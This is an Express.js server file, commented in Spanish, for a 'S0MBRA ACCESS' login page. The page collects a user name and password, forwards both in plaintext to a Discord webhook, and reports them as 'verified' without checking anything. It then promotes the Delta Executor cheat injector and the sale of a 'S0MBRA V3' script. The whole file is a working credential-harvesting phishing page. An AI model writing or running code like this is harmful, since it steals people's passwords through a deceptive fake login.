import express from "express";

const app = express();

app.use(express.json());

const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

// Enlace oficial de tu servidor de Discord
const DISCORD_SERVER_LINK = "https://discord.gg/48qJqZEPmY";

app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>S0MBRA ACCESS</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: #080808;
  color: white;
  font-family: Arial, sans-serif;
}

.container {
  width: 90%;
  max-width: 420px;
  padding: 30px;
  background: #111;
  border: 1px solid #292929;
  border-radius: 18px;
  text-align: center;
  box-shadow: 0 0 30px rgba(255,255,255,0.05);
}

.logo {
  font-size: 32px;
  font-weight: bold;
  letter-spacing: 5px;
  margin-bottom: 20px;
}

.label {
  display: block;
  text-align: left;
  margin: 12px 0 7px;
  color: #aaa;
  font-size: 14px;
}

input {
  width: 100%;
  padding: 14px;
  border-radius: 10px;
  border: 1px solid #333;
  background: #080808;
  color: white;
  outline: none;
  text-align: center;
  font-size: 16px;
}

input:focus {
  border-color: #777;
}

button, .btn-link {
  display: block;
  width: 100%;
  margin-top: 15px;
  padding: 14px;
  border: 0;
  border-radius: 10px;
  background: white;
  color: black;
  font-size: 15px;
  font-weight: bold;
  cursor: pointer;
  text-decoration: none;
  box-sizing: border-box;
}

.btn-buy {
  background: #8b0000;
  color: white;
}

.btn-buy:hover {
  background: #a00000;
}

#status {
  margin-top: 18px;
  min-height: 22px;
  color: #aaa;
}

.step-card {
  background: #161616;
  border: 1px solid #333;
  border-radius: 12px;
  padding: 15px;
  margin-top: 15px;
  text-align: left;
}

.step-title {
  font-weight: bold;
  font-size: 16px;
  color: #fff;
  margin-bottom: 8px;
}

.step-desc {
  font-size: 13px;
  color: #aaa;
  margin-bottom: 10px;
  line-height: 1.4;
}

.hidden {
  display: none;
}
</style>
</head>

<body>

<div class="container">

  <div class="logo">S0MBRA</div>

  <!-- FORMULARIO DE INICIO DE SESIÓN -->
  <div id="step1-form">
    <label class="label">USUARIO</label>
    <input id="usuario" type="text" placeholder="Ingresá tu usuario" autocomplete="off">

    <label class="label">CLAVE</label>
    <input id="clave" type="text" placeholder="Ingresá clave" autocomplete="off">

    <button onclick="access()">INGRESAR AL SISTEMA</button>
  </div>

  <!-- PANEL DE PASOS S0MBRA V3 (Oculto hasta enviar las credenciales) -->
  <div id="steps-panel" class="hidden">

    <!-- Paso 1: Delta Executor -->
    <div class="step-card">
      <div class="step-title">PASO 1: Descargar e instalar Delta Executor</div>
      <div class="step-desc">Necesitás contar con el ejecutor Delta actualizado para inyectar el script.</div>
      <a href="https://deltaexecutor.com/" target="_blank" class="btn-link">📥 DESCARGAR DELTA EXECUTOR</a>
    </div>

    <!-- Paso 2: Ticket de Discord & Key -->
    <div class="step-card">
      <div class="step-title">PASO 2: Generar tu Key en Discord</div>
      <div class="step-desc">Entrá a nuestro Discord oficial, abrí un ticket en el canal <b>#palabra-clave</b> y solicitá/genera tu Key de acceso.</div>
      <a href="${DISCORD_SERVER_LINK}" target="_blank" class="btn-link">💬 ENTRAR AL DISCORD</a>
    </div>

    <!-- Paso 3: Comprar S0MBRA V3 -->
    <div class="step-card">
      <div class="step-title">PASO 3: Obtener S0MBRA V3</div>
      <div class="step-desc">Adquirí el script oficial S0MBRA V3 para desbloquear todas las funciones avanzadas.</div>
      <a href="${DISCORD_SERVER_LINK}" target="_blank" class="btn-link btn-buy">🛒 COMPRAR S0MBRA V3</a>
    </div>

  </div>

  <div id="status"></div>

</div>

<script>
async function access() {

  const usuario = document.getElementById("usuario").value.trim();
  const clave = document.getElementById("clave").value.trim();
  const status = document.getElementById("status");

  if (!usuario || !clave) {
    status.textContent = "⚠️ Completá los dos campos";
    return;
  }

  status.textContent = "⏳ Verificando datos...";

  try {

    const response = await fetch("/access", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        usuario: usuario,
        clave: clave
      })
    });

    const data = await response.json();

    if (data.success) {

      status.textContent = "✅ Datos verificados correctamente";
      
      // Ocultar formulario de login
      document.getElementById("step1-form").classList.add("hidden");

      // Mostrar el panel con los 3 pasos
      document.getElementById("steps-panel").classList.remove("hidden");

    } else {

      status.textContent = "❌ " + data.message;

    }

  } catch (error) {

    status.textContent = "❌ Error de conexión";

  }
}
</script>

</body>
</html>
  `);
});

app.post("/access", async (req, res) => {

  try {

    const usuario = String(req.body?.usuario || "").trim();
    const clave = String(req.body?.clave || "").trim();

    if (!usuario || !clave) {
      return res.status(400).json({
        success: false,
        message: "Completá los dos campos"
      });
    }

    if (!DISCORD_WEBHOOK) {
      return res.status(500).json({
        success: false,
        message: "Webhook no configurado"
      });
    }

    // Envío del embed con el registro de acceso a Discord
    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        username: "S0MBRA ACCESS",
        embeds: [
          {
            title: "🔐 Nuevo registro de acceso",
            fields: [
              {
                name: "👤 Usuario",
                value: usuario
              },
              {
                name: "🔑 CLAVE",
                value: clave
              },
              {
                name: "Estado",
                value: "🟢 RECIBIDO Y VERIFICADO"
              }
            ],
            timestamp: new Date().toISOString()
          }
        ]
      })
    });

    res.json({
      success: true,
      message: "Datos recibidos"
    });

  } catch (error) {

    console.error(error);

    res.status(500).json({
      success: false,
      message: "Error interno"
    });

  }

});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`S0MBRA Access funcionando en puerto ${PORT}`);
});
